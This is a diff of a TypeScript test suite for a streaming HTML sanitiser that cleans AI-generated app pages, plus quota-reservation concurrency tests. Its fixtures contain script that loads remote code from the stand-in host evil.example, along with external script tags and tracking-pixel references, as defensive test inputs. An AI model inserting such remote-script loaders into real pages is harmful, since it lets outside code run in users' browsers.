@@ -126,17 +126,33 @@ const CLEAN_HTML =
 /** 带围栏/寒暄/外链/尾部围栏的脏输出（结构闸四类样本的素材）。 */
 const DIRTY_PREFIX = '好的，下面是计算器应用：\n```html\n'
 const DIRTY_SUFFIX = '\n```\n'
+/** script 正文里的外链赋值必须原样保留（剥离会制造残句 → 黑屏；CSP 兜底）。 */
+const INLINE_SCRIPT =
+  "<script>var s=document.createElement('script');s.src='https://evil.example/evil.js';document.body.appendChild(s)</script>"
 const EXTERNAL_HTML =
   '<!doctype html><html><head><style>' +
   'body{background:var(--ageha-bg)}' +
   '.a{background:url("https://evil.example/bg.png")}' +
   '.b{background:url(https://evil.example/b2.png)}' +
   '@import url("https://evil.example/theme.css");' +
-  '</style></head><body>' +
+  '.c{background:url(//evil.example/rel.png)}' +
+  '</style>' +
+  '<link rel="stylesheet" href="https://evil.example/app.css">' +
+  '<link rel="icon" href=//evil.example/icon.png>' +
+  '</head><body>' +
   '<img src="https://evil.example/pixel.png" alt="">' +
   '<img src=https://evil.example/pixel2.png alt="">' +
-  "<script>var s=document.createElement('script');s.src='https://evil.example/evil.js';document.body.appendChild(s)</script>" +
+  '<img src=&quot;https://evil.example/pixel3.png&quot; alt="">' +
+  '<img srcset="https://evil.example/a.png 1x, /local/b.png 2x" alt="">' +
+  '<svg><use xlink:href="https://evil.example/sprite.svg#i"></use></svg>' +
+  '<script src="https://evil.example/external.js"></script>' +
+  INLINE_SCRIPT +
   '</body></html>'
+
+/** 去掉 script 区间后的可见/可加载标记（script 正文由 CSP 兜底，不要求剥离）。 */
+function withoutScriptBlocks(html: string): string {
+  return html.replace(/<script\b[\s\S]*?<\/script\s*>/gi, '')
+}
 
 const BASE_ECLOSION_CONFIG: EclosionConfig = {
   apiKey: 'test-key',
@@ -521,12 +537,17 @@ describe('StreamingHtmlGate', () => {
     expect(Buffer.byteLength(result.html)).toBeLessThanOrEqual(MAX_HTML_BYTES)
   })
 
-  it('strips every external-link form (quoted/unquoted src= / url( / @import)', () => {
+  it('strips every external-link form but keeps script bodies intact (A3 审查)', () => {
     const result = applyHtmlGate(DIRTY_PREFIX + EXTERNAL_HTML + DIRTY_SUFFIX)
     expect(result.invalid).toBe(false)
-    expect(result.html).not.toContain('evil.example')
-    expect(result.html).not.toContain('https://')
-    expect(result.removedSamples.length).toBeGreaterThanOrEqual(6)
+    // script 正文原样保留：剥离 s.src='https://…' 会制造 `el.;` 残句黑屏。
+    expect(result.html).toContain(INLINE_SCRIPT)
+    const withoutScripts = withoutScriptBlocks(result.html)
+    expect(withoutScripts).not.toContain('evil.example')
+    expect(withoutScripts).not.toContain('https://')
+    expect(withoutScripts).not.toContain('//evil.example')
+    // 3×url( + @import + 2×link href + 3×img src + srcset + xlink:href + 外链 script 开标签
+    expect(result.removedSamples.length).toBeGreaterThanOrEqual(11)
   })
 
   it('produces identical output whether tokens arrive whole or in tiny slices', () => {
@@ -538,6 +559,55 @@ describe('StreamingHtmlGate', () => {
     const sliced = gate.finalize()
     expect(sliced.html).toBe(whole.html)
     expect(sliced.removedSamples.length).toBe(whole.removedSamples.length)
+  })
+
+  it('keeps external URLs assigned in JS untouched (A3 审查：剥离残句会黑屏)', () => {
+    const doc =
+      '<!doctype html><html><body><script>var img=new Image();img.src="https://evil.example/x.png";document.body.appendChild(img)</script></body></html>'
+    const result = applyHtmlGate(doc)
+    expect(result.invalid).toBe(false)
+    expect(result.html).toBe(doc)
+    expect(result.removedSamples).toEqual([])
+  })
+
+  it('still strips src= in a script open tag while leaving the body intact', () => {
+    const result = applyHtmlGate(
+      '<!doctype html><html><body><script src="https://evil.example/x.js">var a=1</script></body></html>',
+    )
+    expect(result.invalid).toBe(false)
+    expect(result.html).toContain('<script >var a=1</script>')
+    expect(result.html).not.toContain('evil.example')
+    expect(result.removedSamples.length).toBe(1)
+  })
+
+  it('does not treat </html> inside a script string as the document end', () => {
+    const doc =
+      '<!doctype html><html><body><script>var t="</html>";document.title=t</script><p>ok</p></body></html>'
+    const result = applyHtmlGate(doc)
+    expect(result.invalid).toBe(false)
+    expect(result.html).toBe(doc)
+  })
+
+  it('enforces the 8KB preamble cap within a single push (A3 审查)', () => {
+    const result = applyHtmlGate('x'.repeat(9000) + '<!doctype html><html><body>ok</body></html>')
+    expect(result.invalid).toBe(true)
+    expect(result.reason).toBe('no-document')
+  })
+
+  it('reports overshoot when the streamed tail got stripped at finalize (A3 审查)', () => {
+    const gate = new StreamingHtmlGate()
+    // 无 `</html>` 的文档 + 尾部围栏后直接跟长字母串（> TAIL_HOLD_CHARS=24）：
+    // push 期围栏与字母串被当作正文流式下发，finalize 的 stripTrailingFence
+    // 再把它们削掉——纯增量 delta 撤不回，overshoot > 0 → 路由必须发整文
+    // 替换帧，否则客户端拼流 ≠ 缓存全文。
+    const doc = '<!doctype html><html><body><p>ok</p>'
+    const streamed = gate.push(doc + '\n```' + 'x'.repeat(80))
+    expect(streamed.length).toBeGreaterThan(0)
+    const result = gate.finalize()
+    expect(result.invalid).toBe(false)
+    expect(result.html).toBe(doc)
+    expect(result.overshoot).toBeGreaterThan(0)
+    expect(result.flush).toBe('')
   })
 
   it('holds back a partial pattern split across chunks instead of leaking it', () => {
@@ -1029,6 +1099,87 @@ describe('POST /api/eclosion/generate (§5.3/§9)', () => {
     expect(blocked.json).toMatchObject({ error: 'quota-exceeded', scope: 'global' })
   })
 
+  it('finishes the stream even when quota accounting writes fail (A3 审查)', async () => {
+    class FailingQuotaStore extends MemoryDataStore {
+      override async incrementEclosionDaily(): Promise<number> {
+        throw new Error('disk full')
+      }
+    }
+    const handle = await startUpstream(async (_record, res) => {
+      await streamChat(res, [{ content: CLEAN_HTML }], { usage: 10 })
+    })
+    upstream = handle.server
+    const made = await makeApp({
+      store: new FailingQuotaStore(),
+      eclosion: { baseUrl: handle.baseUrl },
+    })
+    app = made.app
+    store = made.store
+    const cookie = await registerUser(app, 'quota-write-fail')
+
+    const result = await generate(app, cookie)
+    expect(result.status).toBe(200)
+    // 计费异常不得穿出 finally 跳过 finish：SSE 必须正常 done + end。
+    expect(result.frames[result.frames.length - 1]?.event).toBe('done')
+  })
+
+  it('atomically reserves the last daily slot under concurrency (A3 TOCTOU)', async () => {
+    // 两个请求在预占处会合后再放行：两者都已通过「读 used=limit-1」的预检，
+    // 此时只有原子预留能保证只有一个真正生成。
+    class BarrierQuotaStore extends MemoryDataStore {
+      private arrived = 0
+      private release: (() => void) | null = null
+      private readonly barrier = new Promise<void>((resolve) => {
+        this.release = resolve
+      })
+
+      override async reserveEclosionDaily(
+        key: string,
+        day: string,
+        limit: number,
+        amount: number,
+      ): Promise<{ reserved: boolean; used: number }> {
+        this.arrived += 1
+        if (this.arrived >= 2) this.release?.()
+        await this.barrier
+        return super.reserveEclosionDaily(key, day, limit, amount)
+      }
+    }
+
+    const handle = await startUpstream(async (_record, res) => {
+      await streamChat(res, [{ content: CLEAN_HTML }], { usage: 10 })
+    })
+    upstream = handle.server
+    const made = await makeApp({
+      store: new BarrierQuotaStore(),
+      eclosion: { baseUrl: handle.baseUrl },
+    })
+    app = made.app
+    store = made.store
+    const day = utcDayKey()
+    const cookie = await registerUser(app, 'toctou-user')
+    const record = await store.findUserByUsername('toctou-user')
+    const userId = record?.id as string
+    await store.incrementEclosionDaily(eclosionUsageKey(userId, 'basic'), day, 9)
+
+    // 不同 specId → 不同 cacheKey，单飞锁互不串行；并发请求同时越过预检。
+    const [first, second] = await Promise.all([
+      generate(app, cookie, { specId: 'calculator' }),
+      generate(app, cookie, { specId: 'notes' }),
+    ])
+    const results = [first, second]
+    const quotaErrors = results.flatMap((result) =>
+      result.frames.filter(
+        (frame) => frame.event === 'error' && (frame.data as { code?: string }).code === 'quota-exceeded',
+      ),
+    )
+    expect(quotaErrors).toHaveLength(1)
+    expect(results.filter((result) => result.frames.some((frame) => frame.event === 'done'))).toHaveLength(1)
+    // 只有拿到租约的请求发起上游生成；计数恰好停在 10，不越过日额度。
+    expect(handle.requests.length).toBe(1)
+    expect(await store.getEclosionDaily(eclosionUsageKey(userId, 'basic'), day)).toBe(10)
+  })
+
   it('flags invalid outputs (no document / oversize) and never caches them', async () => {
     let mode: 'prose' | 'oversize' = 'prose'
     const handle = await startUpstream(async (_record, res) => {
@@ -1078,7 +1229,9 @@ describe('POST /api/eclosion/generate (§5.3/§9)', () => {
 
     const result = await generate(app, cookie)
     expect(result.status).toBe(200)
-    expect(htmlOf(result.frames)).not.toContain('evil.example')
+    // script 正文里的外链赋值合法保留；脚本外的外链引用必须全部剥离。
+    expect(htmlOf(result.frames)).toContain(INLINE_SCRIPT)
+    expect(withoutScriptBlocks(htmlOf(result.frames))).not.toContain('evil.example')
 
     const records = lines.map((line) => JSON.parse(line) as Record<string, unknown>)
     const generateAudit = records.find((record) => record.audit === 'eclosion.generate')
@@ -1120,6 +1273,30 @@ describe('DataStore eclosion surface (memory + file)', () => {
     expect(await store.getEclosionDaily('usage:u1:basic', '2026-10-02')).toBe(2)
     expect(await store.getEclosionDaily('usage:u1:basic', '2026-10-03')).toBe(0)
 
+    // 原子预留（A3 审查）：额度边界上 all-or-nothing，并发预留不越限。
+    expect(await store.reserveEclosionDaily('usage:u1:basic', '2026-10-02', 4, 1)).toEqual({
+      reserved: true,
+      used: 3,
+    })
+    expect(await store.reserveEclosionDaily('usage:u1:basic', '2026-10-02', 4, 1)).toEqual({
+      reserved: true,
+      used: 4,
+    })
+    expect(await store.reserveEclosionDaily('usage:u1:basic', '2026-10-02', 4, 1)).toEqual({
+      reserved: false,
+      used: 4,
+    })
+    const races = await Promise.all(
+      Array.from({ length: 5 }, () =>
+        store.reserveEclosionDaily('usage:u1:basic', '2026-10-02', 5, 1),
+      ),
+    )
+    expect(races.filter((race) => race.reserved)).toHaveLength(1)
+    expect(await store.getEclosionDaily('usage:u1:basic', '2026-10-02')).toBe(5)
+    // 释放预占（缓存命中/未生成路径）不影响其他键。
+    await store.incrementEclosionDaily('usage:u1:basic', '2026-10-02', -1)
+    expect(await store.getEclosionDaily('usage:u1:basic', '2026-10-02')).toBe(4)
+
     await store.putEclosionCache('k', '<html></html>')
     expect(await store.getEclosionCache('k')).toBe('<html></html>')
     expect(await store.getEclosionCache('missing')).toBeNull()
@@ -1145,13 +1322,21 @@ describe('DataStore eclosion surface (memory + file)', () => {
     const first = new FileDataStore(file)
     await first.init()
     await first.incrementEclosionDaily('usage:u1:basic', '2026-10-02', 3)
+    expect(await first.reserveEclosionDaily('usage:u1:basic', '2026-10-02', 5, 2)).toEqual({
+      reserved: true,
+      used: 5,
+    })
+    expect(await first.reserveEclosionDaily('usage:u1:basic', '2026-10-02', 5, 1)).toEqual({
+      reserved: false,
+      used: 5,
+    })
     await first.putEclosionCache('basic:calculator:v1:m', CLEAN_HTML)
     expect(await first.acquireEclosionLock('basic:calculator:v1:m', 'holder', 60_000)).toBe(true)
     await first.close()
 
     const second = new FileDataStore(file)
     await second.init()
-    expect(await second.getEclosionDaily('usage:u1:basic', '2026-10-02')).toBe(3)
+    expect(await second.getEclosionDaily('usage:u1:basic', '2026-10-02')).toBe(5)
     expect(await second.getEclosionCache('basic:calculator:v1:m')).toBe(CLEAN_HTML)
     // 锁不持久化：重启后可立即获取。
     expect(await second.acquireEclosionLock('basic:calculator:v1:m', 'holder2', 60_000)).toBe(true)
@@ -1283,6 +1468,30 @@ describe('POST /api/eclosion/generate × kind=imagine (§7)', () => {
     const user = messages[1]!.content
     // 模板行整体固定：query 槽位内空白折叠，首行就是完整模板句。
     expect(user.split('\n')[0]).toBe('用户想要一个应用：番茄钟 + 白噪音。按应用生成契约输出。')
+  })
+
+  it('caps upstream content while streaming (A3 审查)', async () => {
+    const { streamEclosionCompletion, MAX_CONTENT_CHARS } = await import(
+      '../src/eclosion/upstream'
+    )
+    const big = 'x'.repeat(Math.ceil(MAX_CONTENT_CHARS / 2) + 1)
+    const sse =
+      `data: ${JSON.stringify({ choices: [{ delta: { content: big } }] })}\n\n` +
+      `data: ${JSON.stringify({ choices: [{ delta: { content: big } }] })}\n\n`
+    const fakeFetcher = (async () =>
+      new Response(sse, {
+        status: 200,
+        headers: { 'content-type': 'text/event-stream' },
+      })) as typeof fetch
+
+    await expect(
+      streamEclosionCompletion({
+        fetcher: fakeFetcher,
+        config: BASE_ECLOSION_CONFIG,
+        messages: [{ role: 'user', content: 'x' }],
+        signal: new AbortController().signal,
+      }),
+    ).rejects.toThrow(/content output exceeds size limit/)
   })
 
   it('never touches the shared cache: identical queries always re-generate (个人版本)', async () => {
